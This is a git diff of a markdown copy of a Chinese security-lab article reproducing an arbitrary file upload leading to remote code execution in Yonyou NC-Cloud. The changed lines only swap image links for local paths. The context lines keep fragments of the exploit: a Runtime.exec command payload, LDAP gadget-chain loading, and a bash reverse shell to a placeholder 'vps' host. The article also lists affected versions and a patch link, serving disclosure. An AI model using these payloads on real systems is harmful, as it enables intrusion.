@@ -54,7 +54,7 @@ schema_version: "1"
 
   
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/1111f8ea9464717e719cb09b19b686b835789e3aa50de5d27fc0b5bbfbcf5737.png)
 
   
 
@@ -64,7 +64,7 @@ schema_version: "1"
 
 **本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/1111f8ea9464717e719cb09b19b686b835789e3aa50de5d27fc0b5bbfbcf5737.png)
 
   
 
@@ -74,7 +74,7 @@ schema_version: "1"
 
 用友 NC-Cloud 是用友网络科技公司推出的一款面向中小企业的云服务产品。该产品整合了用友各类管理软件如 ERP、CRM、OA 等, 实现了这些软件的云化部署。用友 NC-Cloud 存在任意文件上传漏洞，通过 uapjs（jsinvoke）利用漏洞可非法上传后后门程序。该漏洞利用难度低，可导致远程命令执行，建议尽快修复。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/1111f8ea9464717e719cb09b19b686b835789e3aa50de5d27fc0b5bbfbcf5737.png)
 
   
 
@@ -84,7 +84,7 @@ schema_version: "1"
 
 NC63、NC633、NC65、NC Cloud1903、NC Cloud1909、NC Cloud2005、NC Cloud2105、NC Cloud2111、YonBIP 高级版 2207
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/1111f8ea9464717e719cb09b19b686b835789e3aa50de5d27fc0b5bbfbcf5737.png)
 
   
 
@@ -94,7 +94,7 @@ NC63、NC633、NC65、NC Cloud1903、NC Cloud1909、NC Cloud2005、NC Cloud2105�
 
 1. 访问漏洞环境
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hABfIKLDNyvCqAuIrBGgTebp21qLQ8dbOuQ3KfI8Or23r3T5DCpT1QKrIPWiaOkJMYFicUMLe6C4cPw/640?wx_fmt=png)
+![](../../.resource/remote/d40a9fe062b4554fba855ea34edd70a9f4214cddf420874dcda3b08a8331de28.png)
 
 2. 对漏洞进行复现  
 
@@ -112,7 +112,7 @@ Content-Type: application/x-www-form-urlencoded
 
 POST 请求，响应存在漏洞
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hABfIKLDNyvCqAuIrBGgTebiaPO9HvpAcWXDpZn1Ysln3vzPlzEsK0zP8hhmKugGepXA4MXRgNBOTA/640?wx_fmt=png)
+![](../../.resource/remote/6afb87df863b1f1fa115573416bc2fd04efa7b5bf1144ee8871061bb61c0ab67.png)
 
        命令执行操作（ipconfig）
 
@@ -131,7 +131,7 @@ cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig")
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hABfIKLDNyvCqAuIrBGgTeb82v7kOAY3fniaibsR3qnBGsyLtibNrmQxhArJbPLjosNpbouIEdA2Dohw/640?wx_fmt=png)
+![](../../.resource/remote/b79252563acac2855e3c492e528d2b85a78bbb8aa2a23bcfc598742616827c6c.png)
 
      3. 反弹 shell 参考这篇文章。
 
@@ -144,7 +144,7 @@ cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig")
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hABfIKLDNyvCqAuIrBGgTebNvb8KYFOafuzZsPpiaLcxoc9CTPhjxBwbwL6nMRRsERWRBscDjJ5p0w/640?wx_fmt=png)
+![](../../.resource/remote/9ea2f18392b80c3f30ac8e05a24acda9e0a88a14b4268d3b540a9418eca5672e.png)
 
     使用 ladp 加载利用链 
 
@@ -158,11 +158,11 @@ Content-Type: application/x-www-form-urlencoded
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGsGJCT6aJ4yOaX7ZXp7FRSIOpMdlOWcGVQv94ohcCzSthuetTexic32ibw/640?wx_fmt=png)
+![](../../.resource/remote/77a929879524f060080dbe269fd6f52e3bc690e04183cd1cff1d67b8a15e9997.png)
 
 vps 开始 ladp 监听
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hABfIKLDNyvCqAuIrBGgTebhN0IibiaGFwcUMboxxPEkcnfVAWRCZJiaEFW9nhcKplyVlicBUzU1tLHBw/640?wx_fmt=png)
+![](../../.resource/remote/4bca6c0479bb8f9e2ea11985e00b876219999a9e400129ae110b836b75cc303e.png)
 
 bash 反弹 shell
 
@@ -178,13 +178,13 @@ cmd: bash -i >& /dev/tcp/vps/12388 0>&1
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hABfIKLDNyvCqAuIrBGgTebIrsfL6VIAsQ8hIIpuuySJlib5oTx2kv1ISVzRzhicOnoBSuDobibkl3BQ/640?wx_fmt=png)
+![](../../.resource/remote/5d0e2854dce17df0b66141a9b398db5dca5ca1118c01010e54a14cb4f7aaf8ce.png)
 
 vps 监听 12388 端口获取反弹 shell。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGsoib9r0tqudcl2Ue4LAmP6c6GVvxKzYfH6Vd1iarE4hLl8cZwo3ibElfoQ/640?wx_fmt=png)
+![](../../.resource/remote/706c842ecb14a72ebd6d686575429e1319d9b70a00a0d80ee2b8169907426b2f.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/1111f8ea9464717e719cb09b19b686b835789e3aa50de5d27fc0b5bbfbcf5737.png)
 
   
 
@@ -205,7 +205,7 @@ https://dsp.yonyou.com/patchcenter/patchdetail/11231678267338650434/0/2
 
 口号 网安引领时代，弥天点亮未来
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 
+![](../../.resource/remote/c6a1f1785136ac8e3569e121fb1e5363476b21cca8e6c6d753990c3e7a635b3c.gif) 
 
 知识分享完了
 
@@ -221,7 +221,7 @@ https://dsp.yonyou.com/patchcenter/patchdetail/11231678267338650434/0/2
 
 安全实验室  
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)
+![](../../.resource/remote/3c760224fd27cc6dbcd693aed8b85f6c1ac55b4d648247f6ba7ffb9ff0637f01.jpg)
 
 ---
 
